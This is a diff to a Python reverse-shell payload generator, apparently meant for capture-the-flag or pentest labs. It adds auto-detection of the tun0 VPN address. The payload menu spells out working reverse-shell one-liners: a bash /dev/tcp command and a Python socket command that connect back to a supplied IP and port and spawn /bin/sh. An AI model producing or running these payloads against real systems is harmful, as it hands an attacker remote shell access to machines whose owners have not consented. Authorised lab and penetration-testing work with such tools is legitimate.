@@ -2,6 +2,7 @@ from rich import print
 from rich.console import Console
 from rich.panel import Panel
 from pyfiglet import Figlet
+import netifaces as ni
 import sys
 
 
@@ -33,29 +34,58 @@ def show_banner():
 
 show_banner()
 
+import netifaces as ni
+
+
+def get_tun0_ip():
+    """Get IP from tun0 interface"""
+    try:
+        if "tun0" not in ni.interfaces():
+            console.print("[yellow]⚠️  tun0 not found[/yellow]")
+            return None
+        addrs = ni.ifaddresses("tun0")
+        if ni.AF_INET in addrs:
+            ip = addrs[ni.AF_INET][0]["addr"]
+            console.print(f"[green]✓[/green] tun0: [cyan]{ip}[/cyan]")
+            return ip
+    except:
+        return None
+    return None
+
+
 # === Usage Panel
 print(
     Panel.fit(
-        "[bold white]Usage:[/bold white] python3 payloadgen.py [bold cyan]<IP> <PORT>[/bold cyan]\n\n"
-        "[bold]Example:[/bold] python3 payloadgen.py 10.10.14.5 4444",
+        "[bold white]Usage:[/bold white] python3 payloadgen.py [bold cyan]<IP|--tun0> <PORT>[/bold cyan]\n\n"
+        "[bold]Examples:[/bold]\n"
+        "  python3 payloadgen.py 10.10.14.5 4444\n"
+        "  python3 payloadgen.py --tun0 4444",
         title="[bold yellow]📘 How to use[/bold yellow]",
         border_style="blue",
     )
 )
 
+
 # === Argument check
-if len(sys.argv) != 3:
+if len(sys.argv) == 3 and sys.argv[1] == "--tun0":
+    ip = get_tun0_ip()
+    if not ip:
+        console.print("[red]Failed to detect tun0[/red]")
+        sys.exit(1)
+    port = sys.argv[2]
+elif len(sys.argv) == 3:
+    ip = sys.argv[1]
+    port = sys.argv[2]
+else:
     console.print(
-        "[bold red]❌ Error:[/bold red] You must provide [cyan]<IP>[/cyan] and [cyan]<PORT>[/cyan]."
+        "[bold red]❌ Error:[/bold red] You must provide [cyan]<IP|--tun0>[/cyan] and [cyan]<PORT>[/cyan]."
     )
     sys.exit(1)
 
-ip = sys.argv[1]
-port = sys.argv[2]
 
 # === Menu
 payloads = {
-    "1": ("Bash TCP", f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
+    "1": ("Bash TCP", f"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"),
     "2": (
         "Python TCP",
         f'python3 -c \'import os,socket,subprocess;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\'',
